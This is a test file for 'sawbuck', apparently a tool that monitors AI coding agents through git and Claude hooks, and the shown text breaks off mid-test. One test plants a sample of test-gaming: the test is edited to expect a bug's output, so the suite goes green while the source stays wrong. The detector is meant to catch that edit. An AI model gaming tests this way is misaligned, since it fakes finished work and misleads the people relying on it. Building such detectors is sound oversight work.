// CLI + ranker behavior tests (node:test). Run: npm test (or node --test).
// Covers the glue built this session: attach/detach wiring, the isolation
// invariant (attach leaves the worktree clean; detach is a true inverse),
// verify/dry-run, rank's per-path filtering, and context.

import { TMP_HOME } from '../testkit.mjs';   // first: a throwaway HOME and temp folder for everything this file starts
import { PW as ENGINE_BIN } from '../bins.mjs';
import { createServer } from 'node:http';
import { execFile } from 'node:child_process';
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, readFileSync, existsSync, rmSync, mkdirSync, realpathSync, chmodSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import { globToRe, mandateHits, mandatesInForce, protectedDirty } from '../contract.mjs';
import { ensureExcluded } from '../exclude.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const CLI = join(HERE, '..', 'sawbuck.mjs');
// TMP_HOME (testkit.mjs) keeps the global registry (~/.sawbuck) out of the real home.
const sawbuck = (args, cwd, env) => execFileSync(process.execPath, [CLI, ...args], { cwd, encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, ...env } });
// the recording engine (what the hook runs on each commit); `sawbuck check` is now the loud one-shot
const REFLECT = join(HERE, '..', 'reflect.mjs');
const reflect = (args, cwd, env) => { try { return execFileSync(process.execPath, [REFLECT, ...args], { cwd, encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, ...env } }); } catch (e) { return (e.stdout || '') + (e.stderr || ''); } };
const porcelain = (d) => execFileSync('git', ['-C', d, 'status', '--porcelain'], { encoding: 'utf8' }).trim();

function tmpRepo() {
  const d = mkdtempSync(join(tmpdir(), 'sawbuck-cli-'));
  const g = (...a) => execFileSync('git', ['-C', d, ...a], { encoding: 'utf8' });
  g('init', '-q'); g('config', 'user.email', 't@t'); g('config', 'user.name', 't');
  writeFileSync(join(d, 'a.js'), 'export const v = 1;\n'); g('add', '-A'); g('commit', '-qm', 'init');
  return { d, g };
}

test('init --yes writes a contract and investigates git history (evidence-backed guards)', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'package.json'), '{"name":"x","type":"module","scripts":{"test":"node --test"}}');
    g('add', '-A'); g('commit', '-qm', 'add package.json');
    // a commit that adds a suppression, so the git-history investigation has something to find
    writeFileSync(join(d, 'a.js'), 'export const v = 1; // eslint-disable-line\n');
    g('commit', '-qam', 'quick fix with a suppression');
    const o = sawbuck(['init', '--yes'], d);
    const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
    assert.ok(Array.isArray(cfg.metrics) && cfg.metrics.length > 0, 'contract has metrics');
    assert.ok(cfg.metrics.some((m) => m.name === 'suppressions'), 'suppressions guard present');
    assert.match(o, /investigated this repo/);
    assert.match(o, /history: \d+ commits/);
    assert.match(o, /<- \d+ suppression/, 'tied the suppressions guard to real history');
    // init also writes the agent-orienting contract block (and suppresses promptwheel's own, no double)
    assert.match(o, /agent guide/, 'reports writing the agent guide');
    const agents = readFileSync(join(d, 'AGENTS.md'), 'utf8');
    assert.match(agents, /<!-- sawbuck:contract -->/, 'wrote the sentinel-delimited contract block');
    assert.match(agents, /run `(npx -y )?sawbuck check`/, 'the block orients the agent');
    assert.ok(!/promptwheel:gate/.test(agents), 'suppressed the promptwheel gate block (no double block)');
    assert.throws(() => sawbuck(['init', '--yes'], d), 'refuses to clobber an existing contract without --force');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('event feed: the check logs every result (gamed + verified) and sawbuck status --log reads it', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, repeat: 1, metrics: [{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }] }));
    writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b;\n');   // bug: should be a - b
    const honestTest = "import {test} from 'node:test'; import assert from 'node:assert'; import {sub} from './calc.mjs';\ntest('sub', () => assert.strictEqual(sub(5, 3), 2));\n";
    writeFileSync(join(d, 'calc.test.mjs'), honestTest);
    g('add', '-A'); g('commit', '-qm', 'task: sub is red');
    // GAMED: edit the TEST to expect the bug, source stays wrong
    writeFileSync(join(d, 'calc.test.mjs'), "import {test} from 'node:test'; import assert from 'node:assert'; import {sub} from './calc.mjs';\ntest('sub', () => assert.strictEqual(sub(5, 3), 8));\n");
    g('commit', '-qam', 'make the suite green');
    reflect(['--repo', d], d);
    // VERIFIED: fix the source, restore the honest test
    writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a - b;\n');
    writeFileSync(join(d, 'calc.test.mjs'), honestTest);
    g('commit', '-qam', 'fix sub in source');
    reflect(['--repo', d], d);
    const feed = readFileSync(join(d, '.sawbuck', 'activity.jsonl'), 'utf8');
    assert.match(feed, /"kind":"gamed"/, 'the gamed check was logged');
    assert.match(feed, /"kind":"verified"/, 'the verified check was logged too (not only catches)');
    const log = sawbuck(['status', '--log'], d);
    assert.match(log, /sawbuck activity/);
    assert.match(log, /verified/);
    assert.match(log, /gamed/);
    // `-n N` is a flag with a value, not the repo path (it used to resolve to a directory named -n)
    const one = sawbuck(['status', '--log', '-n', '1'], d);
    assert.match(one, /sawbuck activity \(last 1\)/, '-n limits the feed instead of being read as the repo path');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('status: the inventory unions outcomes, live debt, and the armed state', () => {
  const { d, g } = tmpRepo();
  try {
    // an armed repo with a bare (undocumented) suppression committed into HEAD -> live debt
    writeFileSync(join(d, 'promptwheel.config.json'), '{"metrics":[]}');
    writeFileSync(join(d, 'a.js'), 'export const v = 1; // eslint-disable-line\n');
    g('commit', '-qam', 'add a bare suppression');
    // seed the outcome record (what the check has caught over time) + the per-check feed
    mkdirSync(join(d, '.sawbuck'), { recursive: true });
    writeFileSync(join(d, '.sawbuck', 'results.json'), JSON.stringify({ regressions: 1, gamed: 2, latest: { kind: 'gamed', file: 'a.js', reason: 'the win came from editing the test', at: '2026-10-31T00:00:00Z' } }));
    writeFileSync(join(d, '.sawbuck', 'activity.jsonl'),
      [{ at: '2026-10-30T00:00:00Z', kind: 'verified', file: 'a.js' }, { at: '2026-10-31T00:00:00Z', kind: 'gamed', file: 'a.js' }].map((e) => JSON.stringify(e)).join('\n') + '\n');

    const o = sawbuck(['status', '.'], d);
    assert.match(o, /Caught for you/, 'surfaces the outcome record');
    assert.match(o, /verified/, 'shows the recent-check breakdown');
    assert.match(o, /Debt accruing now/, 'surfaces the live-debt section');
    assert.match(o, /Measuring here/, 'reports whether it is armed here');

    const j = JSON.parse(sawbuck(['status', '.', '--json'], d));
    assert.equal(j.outcomes.gamedAllTime, 2, 'all-time gamed count from the record');
    assert.equal(j.state, 'ready', 'a config present, not wired -> ready');
    // The live-debt capability needs a provider with `audit --json` (logbook >= 0.9.5); with an older
    // provider the memory adapter degrades to no debt (never a crash). When the provider DID answer, it
    // must have counted the committed bare suppression.
    if (j.debt && j.debt.total > 0) assert.ok(j.debt.undocumented >= 1, 'the bare suppression reads undocumented');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('git attach leaves the worktree clean and detach --verify proves full removal', () => {
  const { d } = tmpRepo();
  try {
    assert.equal(porcelain(d), '', 'clean before');
    sawbuck(['attach', '.'], d);
    assert.equal(porcelain(d), '', 'attach touched nothing in the tracked worktree');
    assert.ok(existsSync(join(d, '.git', 'sawbuck', 'attach.json')), 'receipt written in .git (out of tree)');
    const v = sawbuck(['detach', '--verify', '.'], d);
    assert.match(v, /verified/);
    assert.ok(!existsSync(join(d, '.git', 'sawbuck')), 'receipt removed');
    const xf = join(d, '.git', 'info', 'exclude');
    if (existsSync(xf)) assert.doesNotMatch(readFileSync(xf, 'utf8'), /sawbuck/, 'exclude block removed');
    assert.equal(porcelain(d), '', 'clean after');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('attach --git wires an idempotent post-commit hook; detach is a true inverse', () => {
  const { d } = tmpRepo();
  try {
    sawbuck(['attach', '--git', '.'], d);
    const pc = join(d, '.git', 'hooks', 'post-commit');
    assert.ok(existsSync(pc), 'post-commit created');
    assert.match(readFileSync(pc, 'utf8'), /# >>> sawbuck >>>/);
    assert.ok(!existsSync(join(d, '.claude')), '--git writes no Claude settings');
    assert.match(sawbuck(['attach', '--git', '.'], d), /already attached/);       // idempotent
    sawbuck(['detach', '.'], d);
    assert.ok(!existsSync(pc), 'post-commit we created is removed, not left as a stub');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('attach takes one mode at a time', () => {
  const { d } = tmpRepo();
  try {
    assert.throws(() => sawbuck(['attach', '--git', '--shared', '.'], d));
    assert.ok(!existsSync(join(d, '.git', 'hooks', 'post-commit')) && !existsSync(join(d, '.claude')), 'nothing written');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('attach preserves a pre-existing post-commit hook and detach restores it', () => {
  const { d } = tmpRepo();
  const pc = join(d, '.git', 'hooks', 'post-commit');
  try {
    writeFileSync(pc, '#!/bin/sh\necho mine\n');
    chmodSync(pc, 0o755);   // a hook git actually runs
    sawbuck(['attach', '--git', '.'], d);
    assert.match(readFileSync(pc, 'utf8'), /echo mine/, 'theirs kept');
    assert.match(readFileSync(pc, 'utf8'), /^#!\/bin\/sh\n# >>> sawbuck >>>/, 'our block goes in right after the shebang line');
    sawbuck(['detach', '.'], d);
    assert.ok(existsSync(pc), 'their hook is NOT deleted (we did not create it)');
    assert.equal(readFileSync(pc, 'utf8'), '#!/bin/sh\necho mine\n', 'restored to theirs, byte for byte');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('attach --dry-run writes nothing', () => {
  const { d } = tmpRepo();
  try {
    const o = sawbuck(['attach', '--dry-run', '.'], d);
    assert.match(o, /would leave/);
    assert.ok(!existsSync(join(d, '.git', 'hooks', 'post-commit')), 'no hook written');
    assert.ok(!existsSync(join(d, '.git', 'sawbuck')), 'no receipt written');
    assert.equal(porcelain(d), '', 'worktree untouched');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('statusline reflects the profile (memory / ready / watching / caught)', () => {
  const { d } = tmpRepo();
  try {
    // logbook history only, no check contract: memory
    writeFileSync(join(d, 'LOGBOOK.md'), '# history\n');
    assert.match(sawbuck(['statusline'], d), /sawbuck · [^ ]+ · memory/);
    // checkable (a contract, or just a test command) but not wired in yet: ready
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ metrics: [{ name: 'x', cmd: 'true', extract: 'exit', direction: 'pass', guard: true }] }));
    assert.match(sawbuck(['statusline'], d), /sawbuck · [^ ]+ · ready/);
    // a record left on disk is not wiring: still ready
    mkdirSync(join(d, '.sawbuck'), { recursive: true });
    writeFileSync(join(d, '.sawbuck', 'state.json'), JSON.stringify({ lastSha: '', turns: 1 }));
    assert.match(sawbuck(['statusline'], d), /sawbuck · [^ ]+ · ready/);
    // wired in (attached): watching
    sawbuck(['attach', '.'], d);
    assert.match(sawbuck(['statusline'], d), /sawbuck · [^ ]+ · watching/);
    // catches recorded: N caught
    writeFileSync(join(d, '.sawbuck', 'results.json'), JSON.stringify({ regressions: 1, gamed: 1, mandates: 1 }));
    assert.match(sawbuck(['statusline'], d), /sawbuck · [^ ]+ · 3 caught/);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('attach refuses a non-git directory', () => {
  const d = mkdtempSync(join(tmpdir(), 'sawbuck-nogit-'));
  try { assert.throws(() => sawbuck(['attach', '.'], d)); }
  finally { rmSync(d, { recursive: true, force: true }); }
});

test('rank filters findings per path (regression for the --file no-op bug)', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'a.js'), 'export const v = 2;\n'); g('add', '-A'); g('commit', '-qm', 'fix: patch a');  // fix touches a.js
    writeFileSync(join(d, 'b.js'), 'export const w = 1;\n'); g('add', '-A'); g('commit', '-qm', 'chore: add b');  // no signal, b.js
    const ranked = JSON.parse(sawbuck(['rank', '--base', 'HEAD~2', '--head', 'HEAD', '--json'], d, { LOGBOOK_NO_CACHE: '1' }));
    const a = ranked.find((r) => r.path === 'a.js');
    const b = ranked.find((r) => r.path === 'b.js');
    assert.ok(a && a.score > 0, 'a.js is ranked (it has a fix in its history)');
    assert.ok(!b, 'b.js is NOT ranked, proves per-path filtering, not the old all-equal bug');
    assert.match(a.top[0].subject, /patch a/, 'a.js surfaces its OWN commit');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('rank flags a fix-burst as HOT (3+ fixes clustered in 30 days)', () => {
  const { d, g } = tmpRepo();
  try {
    for (let i = 0; i < 3; i++) { writeFileSync(join(d, 'a.js'), `export const v = ${i + 2};\n`); g('add', '-A'); g('commit', '-qm', `fix: patch ${i}`); }
    const ranked = JSON.parse(sawbuck(['rank', '--base', 'HEAD~3', '--head', 'HEAD', '--json'], d, { LOGBOOK_NO_CACHE: '1' }));
    const a = ranked.find((r) => r.path === 'a.js');
    assert.ok(a && a.hot === true, 'a.js flagged HOT (fix-burst)');
    assert.match(JSON.stringify(a.top), /HOT/, 'surfaces the HOT finding first');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('rank does NOT flag a test rewrite as weakened when it adds more asserts than it removes', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'a.test.js'), "const assert=require('assert');assert.equal(1,1);assert.equal(2,2);\n"); g('add', '-A'); g('commit', '-qm', 'test: add a.test.js');
    writeFileSync(join(d, 'a.test.js'), "const assert=require('assert');assert.equal(1,1);assert.ok(3);assert.ok(4);assert.ok(5);\n"); g('add', '-A'); g('commit', '-qm', 'fix: rework a.test.js');  // del 1, add 3
    const ranked = JSON.parse(sawbuck(['rank', '--base', 'HEAD~2', '--head', 'HEAD', '--json'], d, { LOGBOOK_NO_CACHE: '1' }));
    const a = ranked.find((r) => r.path === 'a.test.js');
    assert.ok(a, 'a.test.js is ranked (it has a fix in its history)');
    assert.doesNotMatch(JSON.stringify(a.top), /weakened/, 'a net-positive rewrite is not flagged as weakened');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('context runs on the working state and prints the leads framing', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'a.js'), 'export const v = 9;\n'); g('add', '-A'); g('commit', '-qm', 'fix: bump a');
    const o = sawbuck(['context'], d, { LOGBOOK_NO_CACHE: '1' });
    assert.match(o, /relevant history/);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('attach --user wires cwd-based (profile-switching) hooks at the user level', () => {
  const { d } = tmpRepo();
  const home = mkdtempSync(join(tmpdir(), 'sawbuck-uhome-'));
  const f = join(home, '.claude', 'settings.json');
  try {
    sawbuck(['attach', '--user', '.'], d, { HOME: home });
    const cfg = JSON.parse(readFileSync(f, 'utf8'));
    assert.match(JSON.stringify(cfg.hooks.UserPromptSubmit), /sawbuck\.mjs.*turn/, 'per-turn hook wired at user level');
    assert.doesNotMatch(JSON.stringify(cfg.hooks.Stop), /--repo/, 'cwd-based: no repo pinned');
    sawbuck(['detach', '--user', '.'], d, { HOME: home });
    assert.ok(!existsSync(f), 'user settings we created are removed (true inverse)');
  } finally { rmSync(d, { recursive: true, force: true }); rmSync(home, { recursive: true, force: true }); }
});

test('the lines a person reads say history, not memory: attach --user, and status where there is history and no check', () => {
  const { d } = tmpRepo();
  const home = mkdtempSync(join(tmpdir(), 'sawbuck-uhome-'));
  try {
    const a = sawbuck(['attach', '--user', '.'], d, { HOME: home });
    assert.match(a, /profile-switches by cwd: /, a);
    assert.doesNotMatch(a, /\bmemory\b/i, a);
    sawbuck(['detach', '--user', '.'], d, { HOME: home });
    writeFileSync(join(d, 'LOGBOOK.md'), '# log\n');   // the history files, and no package.json or contract
    const s = sawbuck(['status', '.'], d, { HOME: home });
    assert.match(s, /no check configured/, s);
    assert.doesNotMatch(s, /\bmemory\b/i, s);
  } finally { rmSync(d, { recursive: true, force: true }); rmSync(home, { recursive: true, force: true }); }
});

test('doctor, status and attach say when the hooks here start an older sawbuck, with the line that brings them up', () => {
  const { d } = tmpRepo();
  const home = mkdtempSync(join(tmpdir(), 'sawbuck-uhome-'));
  try {
    sawbuck(['attach', '--user', '.'], d, { HOME: home });
    // the hooks start a copy that says it is 0.0.1: a stand-in for an old checkout (wavecutter's hooks started 0.2.2 so)
    const f = join(home, '.claude', 'settings.json'); const cfg = readFileSync(f, 'utf8');
    const baked = /"([^"]*sawbuck\.mjs)\\?"/.exec(cfg); assert.ok(baked, cfg.slice(0, 300));
    const old = join(home, 'old'); mkdirSync(old, { recursive: true });
    writeFileSync(join(old, 'sawbuck.mjs'), "if (process.argv.includes('--version')) console.log('0.0.1');\n");
    writeFileSync(join(old, 'package.json'), JSON.stringify({ name: 'sawbuck', version: '0.0.1' }));   // an old checkout has its own
    writeFileSync(f, cfg.split(baked[1]).join(join(old, 'sawbuck.mjs')));
    const doc = spawnSync(process.execPath, [CLI, 'doctor', '.'], { cwd: d, encoding: 'utf8', env: { ...process.env, HOME: home } });
    assert.match(doc.stdout, /OLD\s+user/, doc.stdout); assert.match(doc.stdout, /these hooks start sawbuck 0\.0\.1/, doc.stdout);
    assert.match(doc.stdout, /attach --user/, doc.stdout); assert.equal(doc.status, 1, 'old hooks are a finding');
    const st = sawbuck(['status', '.'], d, { HOME: home }); assert.match(st, /hooks here start sawbuck 0\.0\.1/, st);
    const at = sawbuck(['attach', '.'], d, { HOME: home }); assert.match(at, /already watching here/, at); assert.match(at, /start sawbuck 0\.0\.1/, at);
    // brought up: nothing said
    sawbuck(['attach', '--user', '.'], d, { HOME: home });
    const doc2 = spawnSync(process.execPath, [CLI, 'doctor', '.'], { cwd: d, encoding: 'utf8', env: { ...process.env, HOME: home } });
    assert.doesNotMatch(doc2.stdout, /OLD|start sawbuck 0\.0\.1/, doc2.stdout);
    assert.doesNotMatch(sawbuck(['status', '.'], d, { HOME: home }), /start sawbuck/);
  } finally { rmSync(d, { recursive: true, force: true }); rmSync(home, { recursive: true, force: true }); }
});

test('status reads the version an npx hook names without running it: status reaches no network', () => {
  const { d } = tmpRepo();
  const home = mkdtempSync(join(tmpdir(), 'sawbuck-uhome-')); const bin = mkdtempSync(join(tmpdir(), 'sawbuck-fakebin-'));
  try {
    sawbuck(['attach', '--user', '.'], d, { HOME: home });
    const f = join(home, '.claude', 'settings.json'); const cfg = JSON.parse(readFileSync(f, 'utf8'));
    for (const list of Object.values(cfg.hooks)) for (const h of list) for (const x of h.hooks) x.command = 'npx -y sawbuck@0.0.1 turn --hook';
    writeFileSync(f, JSON.stringify(cfg));
    writeFileSync(join(bin, 'npx'), `#!/bin/sh\ntouch "${join(bin, 'ran')}"\nexit 1\n`); chmodSync(join(bin, 'npx'), 0o755);
    const st = sawbuck(['status', '.'], d, { HOME: home, PATH: `${bin}:${process.env.PATH}` });
    assert.match(st, /hooks here start sawbuck 0\.0\.1/, st);
    assert.ok(!existsSync(join(bin, 'ran')), 'status ran npx');
  } finally { for (const x of [d, home, bin]) rmSync(x, { recursive: true, force: true }); }
});
test('status names attach --shared for old hooks in a team file, and doctor stops at the first hook line that fails', () => {
  const { d } = tmpRepo();
  const home = mkdtempSync(join(tmpdir(), 'sawbuck-uhome-'));
  try {
    sawbuck(['attach', '--shared', '.'], d, { HOME: home });
    const f = join(d, '.claude', 'settings.json'); writeFileSync(f, readFileSync(f, 'utf8').replace(/sawbuck@\d+\.\d+\.\d+/g, 'sawbuck@0.0.1'));
    const st = sawbuck(['status', '.'], d, { HOME: home });
    assert.match(st, /start sawbuck 0\.0\.1/, st); assert.match(st, /attach --shared/, 'the team file\'s own line: ' + st);
    // doctor: the first line fails, and the next is never run (0.2.7 stopped there; each can wait on the network)
    const local = join(d, '.claude', 'settings.local.json'); const mark = join(home, 'second-ran'); const stub = join(home, 'stub', 'sawbuck.mjs');
    mkdirSync(dirname(stub), { recursive: true }); writeFileSync(stub, `import { writeFileSync } from 'node:fs'; writeFileSync(${JSON.stringify(mark)}, '1'); console.log('9.9.9');\n`);   // an ES module, as its name says
    rmSync(f);   // the team file's npx lines would ask the network; this part is about the order
    writeFileSync(local, JSON.stringify({ hooks: { UserPromptSubmit: [{ hooks: [{ type: 'command', command: `node "${join(home, 'gone', 'sawbuck.mjs')}" turn --hook` }, { type: 'command', command: `node "${stub}" turn --hook` }] }] } }));
    spawnSync(process.execPath, [CLI, 'doctor', '.'], { cwd: d, encoding: 'utf8', env: { ...process.env, HOME: home } });
    assert.ok(!existsSync(mark), 'doctor ran the hook line after one that failed');
  } finally { rmSync(d, { recursive: true, force: true }); rmSync(home, { recursive: true, force: true }); }
});
test('status in a repository with no commit yet says so, not "could not read the ledger"', () => {
  const d = mkdtempSync(join(tmpdir(), 'sawbuck-cli-')); execFileSync('git', ['-C', d, 'init', '-q']);
  writeFileSync(join(d, 'a.js'), 'export const v = 1;\n');
  try {
    const o = sawbuck(['status', '.'], d);
    assert.doesNotMatch(o, /could not read the ledger/, o); assert.match(o, /no commit here yet/, o);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('attach --claude writes gitignored settings.local.json and keeps git status clean', () => {
  const { d } = tmpRepo();
  const f = join(d, '.claude', 'settings.local.json');
  try {
    sawbuck(['attach', '--claude', '.'], d);
    const cfg = JSON.parse(readFileSync(f, 'utf8'));
    assert.match(JSON.stringify(cfg.hooks.UserPromptSubmit), /turn/, 'per-turn (frame + history) hook wired');
    assert.match(JSON.stringify(cfg.hooks.SessionStart), /"matcher":"compact".*turn/, 'the same block is re-injected after a compaction');
    assert.match(JSON.stringify(cfg.hooks.Stop), /__hook/, 'check (reflex) hook wired');
    assert.equal(porcelain(d), '', 'local settings are locally excluded → worktree still clean');
    sawbuck(['attach', '--claude', '.'], d);            // idempotent
    assert.equal(JSON.parse(readFileSync(f, 'utf8')).hooks.UserPromptSubmit.length, 1, 'no duplicate on re-attach');
    sawbuck(['detach', '--claude', '.'], d);
    assert.ok(!existsSync(f), 'local settings we created are removed (true inverse)');
    assert.equal(porcelain(d), '', 'clean after detach');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('attach --claude will not clobber a malformed settings file', () => {
  const { d } = tmpRepo();
  const dir = join(d, '.claude'); const f = join(dir, 'settings.local.json');
  try {
    mkdirSync(dir, { recursive: true }); writeFileSync(f, '{ not json');
    assert.throws(() => sawbuck(['attach', '--claude', '.'], d));
    assert.equal(readFileSync(f, 'utf8'), '{ not json', 'left untouched');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('the reflex keeps the record out of git status under any attach mode (incl. --user)', () => {
  const { d } = tmpRepo();
  try {
    sawbuck(['__hook', '--repo', d], d, { LOGBOOK_NO_CACHE: '1' });
    const ex = readFileSync(join(d, '.git', 'info', 'exclude'), 'utf8');
    assert.match(ex, /# >>> sawbuck >>>/, 'exclude block written by the reflex');
    assert.match(ex, /\.sawbuck\//);
    assert.match(ex, /\.promptwheel\//);
    assert.match(ex, /events\.jsonl/, 'the logbook root ledger cache is excluded (finding #11)');
    assert.match(ex, /LOGBOOK\.md/, 'the logbook digests are excluded too');
    assert.match(ex, /annotations\.jsonl/, 'the logbook annotation plane is excluded too');
    // the records AND the whole logbook root working-set may not dirty git status
    for (const f of ['events.jsonl', 'annotations.jsonl', 'LOGBOOK.md', 'JOURNEY.md']) writeFileSync(join(d, f), 'x\n');
    mkdirSync(join(d, '.sawbuck'), { recursive: true }); writeFileSync(join(d, '.sawbuck', 'results.json'), '{}');
    assert.equal(execFileSync('git', ['-C', d, 'status', '--porcelain'], { encoding: 'utf8' }).trim(), '', 'records + logbook working-set do not dirty git status');
    // retrofit: a stale block (written before events.jsonl was added) is refreshed, not left as-is
    writeFileSync(join(d, '.git', 'info', 'exclude'), '# >>> sawbuck >>>\n.sawbuck/\n.promptwheel/\n# <<< sawbuck <<<\n');
    sawbuck(['__hook', '--repo', d], d, { LOGBOOK_NO_CACHE: '1' });
    assert.match(readFileSync(join(d, '.git', 'info', 'exclude'), 'utf8'), /events\.jsonl/, 'a stale exclude block is retrofitted with events.jsonl');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('check (CLI) leaves an honest source fix uncharted (no false positive through the command)', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, repeat: 1, metrics: [{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }] }));
    writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b; // BUG\n');
    writeFileSync(join(d, 'calc.test.mjs'), "import {test} from 'node:test';import assert from 'node:assert';import {sub} from './calc.mjs';\ntest('sub',()=>assert.strictEqual(sub(5,3),2));\n");
    g('add', '-A'); g('commit', '-q', '-m', 'base (red)');
    writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a - b;\n');   // real fix, test untouched
    g('commit', '-q', '-am', 'fix sub in source');
    reflect(['--repo', d, '--base', 'HEAD~1', '--head', 'HEAD'], d, { LOGBOOK_NO_CACHE: '1' });
    let r = {}; try { r = JSON.parse(readFileSync(join(d, '.sawbuck', 'results.json'), 'utf8')); } catch { /* no file = no catch */ }
    assert.equal((r.gamed || 0) + (r.regressions || 0), 0, 'a red->green fix earned in source is never charted as a catch');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('frame resolves mandates through extends and turn joins frame + history in one block', () => {
  const { d, g } = tmpRepo();
  try {
    mkdirSync(join(d, 'base'), { recursive: true });
    writeFileSync(join(d, 'base', 'shared.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/**'], reason: 'reviewed PR only' }], metrics: [] }));
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ extends: './base/shared.json', mandates: [{ name: 'no-migrations', paths: ['db/migrations/**'] }], metrics: [{ name: 'ok', cmd: 'true', extract: 'exit', direction: 'pass', guard: true }] }));
    writeFileSync(join(d, 'a.js'), 'a\n');
    g('add', '-A'); g('commit', '-q', '-m', 'base');
    const frame = sawbuck(['frame', '.'], d);
    assert.match(frame, /protected, do not touch/);
    assert.match(frame, /src\/auth\/\*\*  \(reviewed PR only\)/, 'the inherited mandate shows with its reason');
    assert.match(frame, /db\/migrations\/\*\*/, 'the local mandate shows');
    writeFileSync(join(d, 'a.js'), 'b\n');
    const turn = sawbuck(['turn', '.'], d, { LOGBOOK_NO_CACHE: '1' });
    assert.ok(turn.startsWith('▣ rules (sawbuck)'), 'turn leads with the frame');
    // no mandates -> frame is silent, turn is silent on a clean trail
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ metrics: [] }));
    assert.equal(sawbuck(['frame', '.'], d).trim(), '');
    assert.match(sawbuck(['frame', '--speak', '.'], d), /no protected paths/);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('contract: the glob dialect matches promptwheel (** crosses dirs, * stays in a segment, bare names match at any depth)', () => {
  assert.ok(globToRe('src/auth/**').test('src/auth/login.js'));
  assert.ok(globToRe('src/auth/**').test('src/auth/deep/er/x.js'));
  assert.ok(!globToRe('src/auth/**').test('src/authz/x.js'));
  assert.ok(globToRe('src/*.js').test('src/a.js'));
  assert.ok(!globToRe('src/*.js').test('src/deep/a.js'));
  assert.ok(globToRe('secrets.json').test('config/secrets.json'));
  assert.ok(globToRe('/secrets.json').test('secrets.json'));
  assert.ok(!globToRe('/secrets.json').test('config/secrets.json'));
});

test('the wall counts only what the turn changed: a protected file the person left dirty before the prompt is spared', () => {
  const { d, g } = tmpRepo();
  try {
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/**'] }], metrics: [] }));
    mkdirSync(join(d, 'src', 'auth'), { recursive: true });
    writeFileSync(join(d, 'src', 'auth', 'old.js'), 'a\n'); writeFileSync(join(d, 'src', 'auth', 'login.js'), 'a\n'); writeFileSync(join(d, 'src', 'x.js'), 'b\n');
    g('add', '-A'); g('commit', '-q', '-m', 'base');
    writeFileSync(join(d, 'src', 'auth', 'old.js'), 'my wip\n');                      // the PERSON's own uncommitted edit
    writeFileSync(join(d, 'src', 'auth', 'new.js'), 'my untracked\n');               // and an untracked file of theirs
    assert.deepEqual(Object.keys(protectedDirty(d)).sort(), ['src/auth/new.js', 'src/auth/old.js']);
    // the prompt begins: `turn` on the UserPromptSubmit hook records the baseline (a compaction re-run does not)
    const turn = (event) => execFileSync(process.execPath, [CLI, 'turn', '--hook', d], { input: JSON.stringify({ hook_event_name: event }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
    // without --hook the hook JSON on stdin is ignored (and stdin is never waited on)
    execFileSync(process.execPath, [CLI, 'turn', d], { input: JSON.stringify({ hook_event_name: 'UserPromptSubmit' }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
    assert.ok(!existsSync(join(d, '.sawbuck', 'state.json')) || !JSON.parse(readFileSync(join(d, '.sawbuck', 'state.json'), 'utf8')).turnBaseline, 'no baseline without --hook');
    turn('UserPromptSubmit');
    const st = JSON.parse(readFileSync(join(d, '.sawbuck', 'state.json'), 'utf8'));
    assert.deepEqual(Object.keys(st.turnBaseline.files).sort(), ['src/auth/new.js', 'src/auth/old.js']);
    const hook = (promptId) => execFileSync(process.execPath, [join(HERE, '..', 'sawbuck-hook.mjs'), '--repo', d, '--by', 'claude', '--stop'], { input: JSON.stringify({ prompt_id: promptId }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME } });
    // the agent only touched src/x.js: the person's dirty protected files do not block the stop
    writeFileSync(join(d, 'src', 'x.js'), 'c\n');
